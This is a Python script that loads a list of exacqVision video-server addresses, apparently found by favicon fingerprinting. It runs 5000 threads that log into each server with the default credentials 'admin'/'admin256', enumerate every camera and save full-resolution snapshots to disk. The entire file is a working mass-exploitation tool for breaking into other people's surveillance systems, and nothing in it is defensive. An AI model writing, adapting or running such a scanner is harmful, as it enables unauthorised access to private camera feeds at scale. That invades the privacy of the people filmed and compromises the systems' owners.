from abc import abstractmethod
import errno
import threading
from queue import Queue
import time
import socket
import csv
import os
import ipaddress
from urllib import request
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import json


q = Queue()

class ExacqVisionCam:
    def __init__(self, address):
        self.address = address
        self.config = []
        self.cameras = []
        self.logged_in = False
        self.session_id = ''

    def login(self):
        url = self.address + '/login.web'
        post_fields = {
            'u': 'admin',
            'p': 'admin256',
            'l': 1,
            's': 0,
            'save': 1,
            'output': 'json',
            }
        try:
            request = Request(url, urlencode(post_fields).encode())
            self.session_id = urlopen(request).read().decode()
            self.logged_in = True
        except:
            return

    def list_cameras(self):
        if (not self.logged_in):
            return
        url = self.address + '/server.web/devices?s=' + self.session_id
        request = Request(url)
        self.camera_list = urlopen(request).read().decode()

    def enum_cameras(self):
        if (not self.logged_in):
            return
        url = self.address + '/server.web/devices?s=' + self.session_id
        try:
            request = Request(url)
            self.config = json.loads(urlopen(request).read().decode())
        except:
            self.logged_in = False
            return

    def save_camera(self, camera):
        if (not self.logged_in):
            return
        url = self.address + '/video.web?s=' + self.session_id + ';camera=' + str(camera['cameraId']) + ';w=1920;h=1080;q=10'
        try:
            request = Request(url)
            image = urlopen(request)
            filename = os.path.join('output', self.address.split('://')[1] + '-' + camera['name'].replace('/', '-').replace('\\', '-') + '-' + str(camera['cameraId']) + '.jpg')
            with open(filename, "wb") as f:
                f.write(image.read())
        except:
            return

    def save_all_cameras(self):
        if (not self.logged_in):
            return
        for device in self.config['devices']:
            for camera in device['cameras']:
                self.save_camera(camera)

        

def dot2LongIP(ip):
    return int(ipaddress.IPv4Address(ip))

def long2DotIP(ipnum):
    return str(int(ipnum / 16777216) % 256) + "." + str(int(ipnum / 65536) % 256) + "." + str(int(ipnum / 256) % 256) + "." + str(ipnum % 256)


def threader():
    while True:
        target = q.get()
        print("Pulling from ", target, "...")
        cam = ExacqVisionCam(target)
        cam.login()
        cam.enum_cameras()
        cam.save_all_cameras()


def loadTargets():
    # open csv file as list
    print("Loading target file...")
    targets = []
    with open(os.path.join('db', 'exacqvision-favicon.txt')) as file:
        for line in file:
            targets.append(line.rstrip())
    print("Target file loaded.")
    return targets



def pullData(targets):
    print("Starting threads...")
    for i in range(5000):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    for target in targets:    
        q.put(target)

    q.join()


if __name__ == '__main__':
    targets = loadTargets()
    pullData(targets)